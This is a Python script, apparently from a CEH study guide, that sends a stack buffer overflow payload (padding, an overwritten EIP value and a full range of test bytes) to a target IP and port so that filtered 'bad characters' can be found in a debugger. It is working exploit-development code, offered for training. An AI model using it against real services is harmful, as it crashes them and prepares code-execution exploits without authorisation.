#!/usr/bin/env python3
"""
Buffer Overflow Bad Character Detection Script
==============================================

This script helps identify bad characters that get corrupted or filtered
during buffer overflow exploitation.

Usage: python3 badchars.py <target_ip> <target_port> [--offset <offset>]

Author: CEH Study Guide
Purpose: Educational - Bad Character Detection
"""

import sys
import socket
import argparse

def generate_all_chars(exclude_chars=None):
    """
    Generate all possible byte values (0x01-0xFF)
    
    Args:
        exclude_chars (list): List of characters to exclude
    
    Returns:
        bytes: All byte values except excluded ones
    """
    if exclude_chars is None:
        exclude_chars = [0x00]  # Null byte is commonly a bad character
    
    all_chars = b""
    for i in range(1, 256):  # Start from 1 to exclude null byte by default
        if i not in exclude_chars:
            all_chars += bytes([i])
    
    return all_chars

def create_badchar_payload(offset, return_address, badchars):
    """
    Create payload with potential bad characters
    
    Args:
        offset (int): Offset to EIP
        return_address (bytes): Address to overwrite EIP with
        badchars (bytes): Bad character sequence to test
    
    Returns:
        bytes: Complete payload
    """
    junk = b"A" * offset
    eip = return_address
    payload = junk + eip + badchars
    
    return payload

def send_badchar_payload(target_ip, target_port, payload, timeout=5):
    """
    Send bad character payload to target
    
    Args:
        target_ip (str): Target IP address
        target_port (int): Target port number
        payload (bytes): Payload to send
        timeout (int): Connection timeout
    
    Returns:
        bool: True if sent successfully
    """
    try:
        conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        conn.settimeout(timeout)
        conn.connect((target_ip, target_port))
        conn.send(payload)
        conn.close()
        return True
        
    except Exception as e:
        print(f"[-] Connection error: {e}")
        return False

def print_char_array(chars, chars_per_line=16):
    """
    Print character array in hex format
    
    Args:
        chars (bytes): Character array to print
        chars_per_line (int): Characters per line
    """
    print("[+] Character array:")
    for i in range(0, len(chars), chars_per_line):
        line = chars[i:i+chars_per_line]
        hex_values = " ".join(f"\\x{b:02x}" for b in line)
        print(f"    {hex_values}")

def main():
    parser = argparse.ArgumentParser(
        description="Buffer Overflow Bad Character Detection Tool",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # Send all characters for testing
  python3 badchars.py 192.168.1.100 9999 --offset 1052
  
  # Exclude specific characters
  python3 badchars.py 192.168.1.100 9999 --offset 1052 --exclude 0x00 0x0a 0x0d
  
  # Custom EIP value
  python3 badchars.py 192.168.1.100 9999 --offset 1052 --eip "\\x42\\x42\\x42\\x42"
  
Steps:
  1. Send payload with all possible characters
  2. Check memory/registers in debugger for corruption
  3. Identify corrupted characters and exclude them
  4. Repeat until no characters are corrupted
        """
    )
    
    parser.add_argument('target_ip', help='Target IP address')
    parser.add_argument('target_port', type=int, help='Target port number')
    parser.add_argument('--offset', type=int, default=1052,
                       help='EIP offset (default: 1052)')
    parser.add_argument('--eip', default="\\x42\\x42\\x42\\x42",
                       help='EIP value in hex format (default: BBBB)')
    parser.add_argument('--exclude', nargs='+', default=['0x00'],
                       help='Characters to exclude (hex format)')
    parser.add_argument('--generate-only', action='store_true',
                       help='Only generate and display character array')
    
    args = parser.parse_args()
    
    # Parse excluded characters
    exclude_chars = []
    for char in args.exclude:
        try:
            if char.startswith('0x'):
                exclude_chars.append(int(char, 16))
            else:
                exclude_chars.append(int(char))
        except ValueError:
            print(f"[-] Invalid character format: {char}")
            return
    
    # Parse EIP value
    try:
        eip_bytes = bytes(args.eip.replace('\\x', '').decode('hex'))
    except:
        # Alternative parsing for modern Python
        eip_str = args.eip.replace('\\x', '')
        if len(eip_str) % 2 != 0:
            print("[-] Invalid EIP format. Use format like \\x42\\x42\\x42\\x42")
            return
        eip_bytes = bytes.fromhex(eip_str)
    
    # Generate character array
    badchars = generate_all_chars(exclude_chars)
    
    print(f"[+] Generating bad character array ({len(badchars)} characters)")
    print(f"[+] Excluded characters: {[hex(c) for c in exclude_chars]}")
    
    if args.generate_only:
        print_char_array(badchars)
        return
    
    # Create and send payload
    payload = create_badchar_payload(args.offset, eip_bytes, badchars)
    
    print(f"[+] Target: {args.target_ip}:{args.target_port}")
    print(f"[+] EIP Offset: {args.offset}")
    print(f"[+] EIP Value: {args.eip}")
    print(f"[+] Payload size: {len(payload)} bytes")
    
    print_char_array(badchars)
    
    print(f"\n[*] Sending bad character payload...")
    
    if send_badchar_payload(args.target_ip, args.target_port, payload):
        print(f"[+] Payload sent successfully!")
        print(f"[*] Check debugger/memory dump for corrupted characters")
        print(f"[*] Look for missing or altered bytes in the character sequence")
        print(f"[*] Common bad characters: \\x00 (null), \\x0a (LF), \\x0d (CR), \\x20 (space)")
    else:
        print(f"[-] Failed to send payload")

if __name__ == "__main__":
    main()

# Common bad characters to watch for:
# \x00 - Null byte (string terminator)
# \x0A - Line Feed (LF)
# \x0D - Carriage Return (CR)
# \x20 - Space character
# \xFF - May be filtered by some applications
